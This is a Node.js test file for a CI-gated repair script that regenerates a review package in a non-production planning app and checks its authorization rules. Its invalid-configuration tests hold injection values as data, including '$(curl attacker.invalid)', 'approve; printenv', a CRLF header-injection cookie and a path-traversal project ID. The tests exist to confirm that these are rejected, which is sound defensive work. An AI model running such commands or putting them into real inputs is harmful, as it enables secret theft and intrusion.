import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { repair, safeSummary } from '../scripts/item78c-referral-repair.mjs';
import { authorize, validateRequest } from '../scripts/item78c-referral-repair-authorize.mjs';

const now = Date.parse('2026-09-28T09:00:00Z');
const sha = 'a'.repeat(40);
const origin = 'https://plannera-ab-git-accept-item-78c-byr-c36eb6-robbietalls-projects.vercel.app';
const environment = () => ({
  GITHUB_REPOSITORY: 'RobbieTall/Plannera-ab', GITHUB_EVENT_NAME: 'workflow_dispatch',
  GITHUB_REF: 'refs/heads/diag/item78c-paid-scope-20260928', GITHUB_SHA: sha,
  ITEM78C_REFERRAL_REPAIR_ONLY: 'true', ITEM78C_REFERRAL_REPAIR_EXPECTED_SHA: sha,
  ITEM78C_REFERRAL_REPAIR_CONFIRMATION: 'REGENERATE PREVIEW REVIEW PACKAGE',
  ITEM78C_REFERRAL_REPAIR_TARGET: 'PROTECTED NON-PRODUCTION',
  ITEM78C_REFERRAL_REPAIR_AUTHORIZED_COMMIT: sha,
  ITEM74H_WORKFLOW_AUTHORIZED_COMMIT: 'fcd0c27c68daea81bd51e28b567e469a5fe6b97a',
  ITEM74H_PREVIEW_MUTATION_APPROVED: 'true',
  ITEM74H_AUTHORIZED_DATABASE_TARGET: 'ep-muddy-dawn-a7tfo3kp',
  PLANNING_PACK_CHECKOUT_ENABLED: 'false', SUBMISSION_SEE_CHECKOUT_ENABLED: 'false',
  PLANNERA_REFERRAL_TEST_BASE_URL: origin, PLANNERA_REFERRAL_TEST_ALLOWED_BASE_URL: origin,
  PLANNERA_REFERRAL_TEST_PROJECT_ID: 'synthetic-project',
  PLANNERA_REFERRAL_TEST_REVIEW_REQUEST_ARTEFACT_ID: 'synthetic-old-review',
  PLANNERA_REFERRAL_TEST_SESSION_COOKIE: 'session=synthetic-only-cookie',
  PLANNERA_REFERRAL_TEST_VERCEL_BYPASS: 'synthetic_bypass_not_a_real_credential',
  GH_TOKEN: 'synthetic-not-a-real-token',
});
const binding = { artefactId: 'synthetic-pack', sourceQuickSiteCheckArtefactId: 'synthetic-qsc', proposalBrief: 'Synthetic fixture proposal' };
const old = () => ({ id: 'synthetic-old-review', projectId: 'synthetic-project', type: 'review_request', staleAt: null,
  payload: { projectId: 'synthetic-project', site: { lga: 'Kempsey' }, detailedPlanningPack: binding } });
const modern = (id = 'synthetic-new-review') => ({ ...old(), id, payload: { ...old().payload,
  consultantNeedsVersion: 'consultant-needs.v1', consultantNeeds: [{ synthetic: true }], disciplinePackages: [{ synthetic: true }] } });
function harness(options = {}) {
  let rows = [old(), { id: 'synthetic-pack', projectId: 'synthetic-project', type: 'detailed_planning_pack', staleAt: null, payload: { proposalBrief: binding.proposalBrief } },
    { id: 'synthetic-qsc', projectId: 'synthetic-project', type: 'quick_site_check', staleAt: null, payload: {} },
    ...(options.candidates || [])];
  if (options.changeSource) options.changeSource(rows);
  const calls = [];
  let timeout = options.timeoutAfterCreate;
  const request = async (url, init) => {
    calls.push({ url, method: init.method });
    assert.equal(new URL(url).origin, origin);
    assert.equal(init.redirect, 'error');
    if (options.httpFailure) return new Response('{}', { status: options.httpFailure });
    if (init.method === 'POST') {
      assert.equal(new URL(url).pathname, '/api/artefacts/request-review');
      assert.deepEqual(JSON.parse(init.body), { projectId: 'synthetic-project', sourceDetailedPlanningPackArtefactId: 'synthetic-pack', expectedProposalBrief: binding.proposalBrief });
      rows.push(modern());
      if (options.alterOriginal) rows[0].staleAt = '2026-09-28T09:00:00Z';
      if (timeout) { timeout = false; throw new Error('synthetic provider timeout containing a private value'); }
      return new Response(JSON.stringify({ artefactId: 'synthetic-new-review', content: modern().payload }), { status: 201 });
    }
    if (url.includes('/consultant-referrals?')) return new Response(JSON.stringify(options.preflight || { enabled: true, referral: null }));
    return new Response(JSON.stringify(rows));
  };
  return { request, calls };
}
test('creates one bound package and preserves original', async () => {
  const h = harness(); const r = await repair(environment(), h.request, now);
  assert.equal(r.passed, true); assert.equal(r.mutationMayHaveOccurred, true);
  assert.equal(h.calls.filter(c => c.method === 'POST').length, 1); safeSummary(r);
});
test('retry reuses existing package without POST', async () => {
  const h = harness({ candidates: [modern()] }); const r = await repair(environment(), h.request, now);
  assert.equal(r.passed, true); assert.equal(r.reused, true); assert.equal(r.mutationMayHaveOccurred, false);
  assert.equal(h.calls.filter(c => c.method === 'POST').length, 0);
});
test('uncertain POST is recovered on next invocation without duplicate creation', async () => {
  const h = harness({ timeoutAfterCreate: true });
  const first = await repair(environment(), h.request, now);
  assert.equal(first.passed, false); assert.equal(first.mutationMayHaveOccurred, true);
  assert.equal(JSON.stringify(first).includes('private value'), false);
  const second = await repair(environment(), h.request, now);
  assert.equal(second.passed, true); assert.equal(second.reused, true);
  assert.equal(h.calls.filter(c => c.method === 'POST').length, 1);
});
test('ambiguous candidates stop before writes', async () => {
  const h = harness({ candidates: [modern(), modern('another-review')] });
  assert.equal((await repair(environment(), h.request, now)).reason, 'ambiguous_reviews');
  assert.equal(h.calls.filter(c => c.method === 'POST').length, 0);
});
for (const [name, change] of [
  ['wrong council', rows => { rows[0].payload.site.lga = 'Byron'; }],
  ['stale original', rows => { rows[0].staleAt = 'old'; }],
  ['wrong project', rows => { rows[1].projectId = 'other'; }],
  ['missing source pack', rows => { rows.splice(1, 1); }],
  ['proposal mismatch', rows => { rows[1].payload.proposalBrief = 'different'; }],
]) test(name + ' stops without writes', async () => {
  const h = harness({ changeSource: change });
  assert.equal((await repair(environment(), h.request, now)).reason, 'source_invalid');
  assert.equal(h.calls.filter(c => c.method === 'POST').length, 0);
});
test('original mutation is detected, not undone or hidden', async () => {
  const h = harness({ alterOriginal: true }); const r = await repair(environment(), h.request, now);
  assert.equal(r.passed, false); assert.equal(r.reason, 'preservation_failed'); assert.equal(r.mutationMayHaveOccurred, true);
});
for (const preflight of [{ enabled: false, referral: null }, { enabled: true, referral: { id: 'existing' } }])
  test('server validator or existing referral blocks success ' + JSON.stringify(preflight), async () => {
    assert.equal((await repair(environment(), harness({ candidates: [modern()], preflight }).request, now)).passed, false);
  });
for (const status of [302, 400, 401, 403, 500]) test('HTTP ' + status + ' fails closed without POST', async () => {
  const h = harness({ httpFailure: status }); assert.equal((await repair(environment(), h.request, now)).reason, 'request_failed');
  assert.equal(h.calls.length, 1); assert.equal(h.calls[0].method, 'GET');
});
for (const [key, value] of [
  ['GITHUB_REF', 'refs/heads/main'], ['GITHUB_EVENT_NAME', 'push'],
  ['ITEM78C_REFERRAL_REPAIR_EXPECTED_SHA', '$(curl attacker.invalid)'],
  ['ITEM78C_REFERRAL_REPAIR_ONLY', 'false'], ['ITEM78C_REFERRAL_REPAIR_CONFIRMATION', 'approve; printenv'],
  ['ITEM78C_REFERRAL_REPAIR_AUTHORIZED_COMMIT', 'b'.repeat(40)],
  ['PLANNING_PACK_CHECKOUT_ENABLED', 'true'],
  ['ITEM74H_AUTHORIZED_DATABASE_TARGET', 'production'],
  ['PLANNERA_REFERRAL_TEST_BASE_URL', 'https://plannera.ai'],
  ['PLANNERA_REFERRAL_TEST_ALLOWED_BASE_URL', origin + '.attacker.invalid'],
  ['PLANNERA_REFERRAL_TEST_PROJECT_ID', '../another-project'],
  ['PLANNERA_REFERRAL_TEST_SESSION_COOKIE', 'session=bad\r\nHost: attacker.invalid'],
]) test('invalid configuration ' + key + ' never accesses resources', async () => {
  let calls = 0; const env = { ...environment(), [key]: value };
  const r = await repair(env, async () => { calls++; throw new Error('must not run'); }, now);
  assert.equal(r.passed, false); assert.equal(calls, 0);
});
test('expiry fails closed', () => assert.throws(() => validateRequest(environment(), Date.parse('2026-09-30T00:00:00Z'))));
const protections = { deployment_branch_policy: { custom_branch_policies: true, protected_branches: false }, can_admins_bypass: false,
  protection_rules: [{ type: 'required_reviewers', reviewers: [{ type: 'User', reviewer: { id: 106786418 } }] }] };
const policies = { total_count: 2, branch_policies: [{ type: 'branch', name: 'diag/item78c-paid-scope-20260928' }, { type: 'branch', name: 'accept/item-78c-byron-kempsey-20260914' }] };
const fakeGit = args => ({ status: args[0] === 'merge-base' && args.at(-1) === 'refs/remotes/origin/main' ? 1 : 0, stdout: sha + '\n' });
const policyApi = async url => new Response(JSON.stringify(url.includes('/runs?') ? { total_count: 0, workflow_runs: [] } : url.includes('/deployment-branch-policies') ? policies : protections));
test('protected exact-commit authorization passes with real policy evidence shape', async () => {
  await authorize(environment(), 'protected', fakeGit, policyApi, now);
});
test('commit already on main fails despite allowed branch name', async () => {
  let network = 0;
  await assert.rejects(authorize(environment(), 'protected', args => ({ status: 0, stdout: sha + '\n' }), async () => { network++; }, now));
  assert.equal(network, 0);
});
test('failed separate repair pin prevents policy/network access', async () => {
  let network = 0;
  await assert.rejects(authorize({ ...environment(), ITEM78C_REFERRAL_REPAIR_AUTHORIZED_COMMIT: 'b'.repeat(40) }, 'protected', fakeGit, async () => { network++; }, now));
  assert.equal(network, 0);
});
test('administrator bypass or absent reviewer fails authorization', async () => {
  for (const altered of [{ ...protections, can_admins_bypass: true }, { ...protections, protection_rules: [] }])
    await assert.rejects(authorize(environment(), 'protected', fakeGit, async () => new Response(JSON.stringify(altered)), now));
});
test('active whole-funnel run denies repair', async () => {
  await assert.rejects(authorize(environment(), 'protected', fakeGit, async url => url.includes('/runs?')
    ? new Response(JSON.stringify({ total_count: 1, workflow_runs: [{}] })) : policyApi(url), now));
});
test('unexpected provider details cannot enter safe output', async () => {
  const r = await repair(environment(), async () => { throw new Error('SECRET_CANARY'); }, now);
  assert.equal(JSON.stringify(safeSummary(r)).includes('SECRET_CANARY'), false);
  assert.throws(() => safeSummary({ ...r, cookie: 'SECRET_CANARY' }));
  assert.throws(() => safeSummary({ ...r, reason: 'SECRET_CANARY' }));
});
test('workflow credentials occur only after protected authorization, never in prerequisite or run interpolation', () => {
  const text = readFileSync(new URL('../.github/workflows/consultant-referral-acceptance.yml', import.meta.url), 'utf8');
  const prerequisite = text.split('  repair-authorize:')[1].split('  repair-preview:')[0];
  assert.equal(prerequisite.includes('secrets.'), false);
  const protectedJob = text.split('  repair-preview:')[1];
  assert.ok(protectedJob.includes('needs: repair-authorize'));
  assert.ok(protectedJob.includes('environment: item78c-kempsey-preview'));
  assert.ok(protectedJob.indexOf('authorize.mjs protected') < protectedJob.indexOf('secrets.'));
  assert.equal(/run:.*\$\{\{\s*inputs\./.test(text), false);
  assert.equal(protectedJob.includes('STRIPE_TEST_SECRET_KEY'), false);
  assert.equal(protectedJob.includes('DATABASE_URL'), false);
  assert.equal(protectedJob.includes('PLANNERA_REFERRAL_TEST_ADMIN_TOKEN'), false);
  assert.ok(text.includes("!inputs.repair_preview_only && github.ref == 'refs/heads/main'"));
});

